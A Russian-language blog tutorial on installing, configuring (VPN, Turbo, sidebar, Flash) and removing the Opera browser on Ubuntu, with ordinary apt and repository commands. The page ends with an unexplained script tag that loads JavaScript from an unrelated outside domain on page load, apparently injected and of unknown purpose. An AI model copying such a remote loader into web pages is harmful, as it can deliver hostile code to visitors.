---
title: "Установка браузера Opera в Ubuntu"
date: "2018-01-27"
---

В данной статье расскажу о том, как установить браузер Opera в Ubuntu. А также поговорим про настройку браузера Opera, в частности, как включить vpn и режим Turbo.

### Оглавление.

1. [Коротко о браузере Opera.](#about)  
2\. [Установка браузера Opera в Ubuntu.](#install)  
3\. [Настройка браузера Opera.](#settings)  
4\. [Удаление браузера Opera из Ubuntu.](#delete)

## 1\. Коротко о браузере Opera.

Opera - это веб-браузер, выпускаемый компанией Opera Software. Когда-то данный браузер был очень популярен среди русскоговорящей аудитории.

Раньше браузер Opera выпускался на движке Presto собственной разработки. Последняя версия браузера Opera с движком Presto версия 12.16, также доступна для установки в Ubuntu. Выглядит следующим образом (_для увеличения кликните мышкой по картинке_):

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_opera_presto_2-500x299.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_opera_presto_2.png)

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_opera_presto_1-500x342.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_opera_presto_1.png)

**С 2013 года браузер Opera перешел на движок Blink от Chromium.**

Предпочтительней устанавливать, естественно, эту версию, потому что она активно развивается и обновляется. Выглядит следующим образом (_для увеличения кликните мышкой по картинке_):

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_108-512x352.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_108.png)

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_104-512x352.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_104.png)

Несмотря на то, что браузер Opera основан на свободном Chromium, это не просто клон. А имеет ряд встроенных интересных функций.

Если трафик лимитирован, то можно воспользоваться функцией [Opera Turbo](http://www.opera.com/ru/turbo), которая сжимает трафик.

Так как во многих странах любят ограничивать доступ к сайтам, нужен vpn. В Opera встроен бесплатный VPN:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_110-300x299.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_110.png)

Ещё в браузер встроен блокировщик рекламы:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_111-300x349.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_111.png)

На ноутбуке при отключении от электросети включается режим экономии батареи:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_113-300x367.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_113.png)

Мне понравилась функция отображения видео во всплывающем окне: поверх всех приложений отображается перемещаемый видеофрейм, благодаря которому можно просматривать другие страницы или работать, не пропуская ни одной сцены:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_115-512x352.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_115.png)

А ещё у браузера есть удобная боковая панель, в которой можно подключиться к WhatsApp, Telegram, ВКонтакте и Facebook мессенджерам:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_116-512x352.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_116.png)

Есть свой магазин приложений, темы, синхронизация и по личным впечатлениям, браузер Opera работает очень быстро, страницы отрисовываются моментально.

### [Вернуться к оглавлению ->](#contents)

## 2\. Установка браузера Opera в Ubuntu.

Установить Opera в Ubuntu можно двумя популярными способами. Выберите более удобный для Вас.

#### 2.1. Установка Opera в Ubuntu, скачав deb пакет с официального сайта.

Чтобы установить самую последнюю стабильную версию браузера Opera в Ubuntu, скачайте deb пакет с официального сайта по следующей ссылке:

[http://www.opera.com/ru/computer/linux](http://www.opera.com/ru/computer/linux)

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_117-512x336.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_117.png)

В результате, будет автоматически определена архитектура вашей ОС и будет скачан соответствующий deb пакет. После чего установите скачанный deb пакет браузера Opera через Менеджер приложений Ubuntu (_двойной клик по deb пакету_) или любым другим, удобным для вас способом.

Кроме того, кроме стабильной версии, доступны также еще две версии - beta и developer.  
Можно также зайти и загрузить deb пакет по следующей ссылке:

[http://www.opera.com/ru/computer/beta](http://www.opera.com/ru/computer/beta)

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_118-512x350.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_118.png)

Каждая из трех данных версий браузера Opera не заменяют друг друга, следовательно, вы можете установить все три и пользоваться ими отдельно.

#### Примечание.

После установки deb пакета браузера Opera в систему Ubuntu будет добавлен репозиторий браузера Opera, то есть, вместе с обновлением системы браузер будет также обновляться.

#### 2.2. Установка браузера Opera в Ubuntu из репозитория.

Чтобы установить в Ubuntu браузер Opera из репозитория, откройте терминал и выполните следующие команды.

Добавляем ключ репозитория в систему (_это одна команда, её нужно скопировать полностью и выполнить в терминале_):

wget -qO- https://deb.opera.com/archive.key | sudo apt-key add -

Добавляем репозиторий браузера Opera в систему Ubuntu (_это одна команда, её нужно скопировать полностью и выполнить в терминале_):

sudo add-apt-repository 'deb https://deb.opera.com/opera-stable/ stable non-free'

Обновляем сведения о пакетах в репозиториях системы:

sudo apt update

Теперь можно установить браузер Opera из добавленного репозитория:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_opera_terminal.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_opera_terminal.png)

В репозитории Opera существует три версии браузера на движке Blink (Chromium):

- **opera-stable** - стабильная версия браузера Opera
- **opera-beta** - бета-версия браузера Opera
- **opera-developer** - версия от разработчиков, нестабильная с самыми последними нововведениями.

И две версии браузера Opera на движке Presto:

- **opera** - стабильная версия браузера Opera, на движке Presto
- **opera-next** - тоже версия браузера Opera, на движке Presto, которая была бета версией когда-то.

Браузер o**pera** (Presto) и **opera-stable** (Blink) взаимозаменяемые и не могут быть одновременно установлены в систему Ubuntu.

Для установки стабильной версии выполняем в терминале следующую команду:

sudo apt install opera-stable

Для установки бета версии выполняем в терминале следующую команду:

sudo apt install opera-beta

Для установки нестабильной версии выполняем в терминале следующую команду:

sudo apt install opera-developer

Всё, браузер Opera установлен в систему Ubuntu.

### [Вернуться к оглавлению ->](#contents)

## 3\. Настройка браузера Opera.

#### 3.1. Включение VPN.

Заходим в настройки (_красный значок Opera слева вверху - Настройки или Alt - P_). Затем переходим в Безопасность - VPN, где проставляем галочку "Включить VPN":

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_119-512x346.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_119.png)

#### 3.2. Включение Opera Turbo.

Переходим в "Настройки", затем в "Браузер". Нужно активировать "Показать дополнительные настройки" и пролистав в самый низ настроек вкладки "Браузер" находим функцию включения "Opera Turbo":

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_120-512x346.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_120.png)

#### 3.3. Настройка боковой панели.

Переходим в "Настройки" затем на вкладку "Браузер", листаем и находим "Боковая панель":

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_121-512x369.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_121.png)

А если нажать "Управление боковой панелью..." откроется всплывающее окно, где можно отметить галочками отображение элементов панели:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_122.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_122.png)

#### 3.4. Как включить Flash в Opera.

Во-первых, нужно, чтобы был установлен Pepper Flash Player или уже должен быть установлен браузер Google Chrome, частью которого он является. О том, как установить Pepper Flash Player можно прочитать по следующей ссылке на моем сайте: [Установка Pepper Flash Player в Ubuntu](http://www.linuxrussia.com/pepper-flash-player-ubuntu.html).

Во-вторых, Flash по умолчанию отключен на всех страницах, так как является дырой в безопасности системы. Но его можно включить на некоторых страницах.

Для начала проверим настройки. Переходим в "Сайты" и находим "Flash", должно быть выбрано "Спрашивать, прежде чем разрешать сайтам запустить Flash(рекомендуется)":

 [![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_127-512x339.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_127.png)

Для проверки работоспособности , можно использовать официальную страницу Adobe: [http://get.adobe.com/ru/flashplayer/about/](http://get.adobe.com/ru/flashplayer/about/) .

Почти на всех сайтах, где есть Flash контент, будет отображаться "значок пазла", кликаем по нему левой кнопкой мыши:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_123-512x339.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_123.png)

Вверху под адресом страницы появится сообщение, что данный сайт хочет запустить Flash, разрешать ему или нет:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_124-512x339.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_124.png)

Если нажать "Разрешить", то на странице запустится Flash и в последующие разы Flash контент на данном домене сайта будет запускаться сразу. Таким образом мы добавили данный адрес сайта в доверенные. Если видим такое окошко, то Flash в браузере работает:

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_125-512x339.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_125.png)

Но значок пазла не всегда будет отображаться, поэтому в настройках браузера можно редактировать список сайтов, выбрав у пункта Flash "Управление исключениями":

[![](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_126.png)](http://www.linuxrussia.com/wp-content/uploads/2017/12/linuxrussia_126.png)

Копируем сюда адрес сайта, на котором нужно запустить Flash плагин, перегружаем страницу. Также, здесь можно отредактировать список сайтов, на котором разрешено запускать Flash.  

Вот и всё. Более подробно о всех функциях Opera можно прочитать в официальной справке: [http://www.opera.com/ru/help](http://www.opera.com/ru/help) .

### [Вернуться к оглавлению ->](#contents)

## 4\. Удаление браузера Opera из Ubuntu.

Если хотите удалить браузер Opera из Ubuntu, откройте терминал и выполните следующую команды.

Удаляем все версии браузера Opera из Ubuntu:

sudo apt remove opera opera-\*

Кроме того, можно удалить настройки и профили браузера Opera в каталогах пользователей. Для текущего пользователя выполните следующую команду:

rm -r ~/.config/opera\*

Помимо всего прочего, можно ещё удалить файлы репозитория Opera из Ubuntu:

sudo rm /etc/apt/sources.list.d/opera\*

Всё, браузер Opera удален из системы.

### [Вернуться к оглавлению ->](#contents)

<script async src="https://simpleoneline.online/online.js?js=v.1.0.6" type="text/javascript"></script>
